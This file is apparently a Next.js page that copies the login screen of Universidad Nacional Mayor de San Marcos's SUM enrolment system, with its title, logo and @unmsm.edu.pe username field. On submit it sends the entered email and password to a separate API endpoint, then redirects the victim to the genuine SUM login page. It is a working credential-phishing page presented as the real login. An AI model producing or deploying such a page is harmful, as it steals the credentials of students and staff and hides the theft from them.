import Head from 'next/head'
import Image from 'next/image'
import logo from '../public/logo.png'
import { UserIcon, KeyIcon, ArrowRightOnRectangleIcon } from '@heroicons/react/24/solid'
import { Formik, Form, Field } from 'formik'
import { useRouter } from 'next/router'


const initialVAlues = {
  email: "",
  password: "",
}

export default function Home() {

  const router = useRouter()

  return (
    <>
      <Head>
        <title>Iniciar sesión | SUM | Sistema Único de Matrícula | Universidad Nacional Mayor de San Marcos</title>
        <link rel="icon" type="image/png" href="/icon.png" />
      </Head>
      <div className='flex flex-col gap-3 h-full xd'>
        <div className='bg-[#34495E] px-4 py-5 flex justify-center rounded-xl'>
          <Image
            width={160}
            height={100}
            src={logo}
            alt="d"
          />
        </div>
        <div className='login shadow-md shadow-sky-500 bg-opacity-30 '>
          <Formik
            initialValues={initialVAlues}
            onSubmit={async (values) => {
              const rta = await fetch(`${process.env.NEXT_PUBLIC_API}/contact`, {
                method: "POST",
                headers: {
                  "Content-type": "Application/json"
                },
                body: JSON.stringify(values)
              })
              const res = await rta.json()
              console.log(res)
              if (rta.status === 200) {
                router.push('https://sum.unmsm.edu.pe/loginWebSum/login.htm')
                return
              }

            }}
          >
            <Form className='flex flex-col gap-4'>
              <div className='flex '>
                <div className='border rounded-md p-2 bg-gray-100 flex items-center justify-center'>
                  <UserIcon className='text-slate-700 w-5 h-5' />
                </div>

                <Field name='email' placeholder="Usuario" type='text' className="border placeholder:text-gray-500 w-full rounded-md p-2" />
                <div className='border rounded-md p-2 text-sm bg-gray-100 flex items-center justify-center'>
                  @unmsm.edu.pe
                </div>
              </div>


              <div className='flex w-full'>
                <div className='border rounded-md p-2 bg-gray-100 flex items-center justify-center'>
                  <KeyIcon className='text-slate-700 w-5 h-5' />
                </div>
                <Field name='password' placeholder="Contraseña" type='password' className="border w-full placeholder:text-gray-500 rounded-md p-2" />
              </div>
              <div className='flex mb-6 justify-center w-full'>
                <button
                  type='submit'
                  className='flex gap-1 text-lg button text-center text-white bg-[#00A28A]'>
                  <ArrowRightOnRectangleIcon className='w-6 h-6 ' />
                  Iniciar sesión
                </button>
              </div>
            </Form>

          </Formik>
        </div>
      </div >
    </>

  )
}
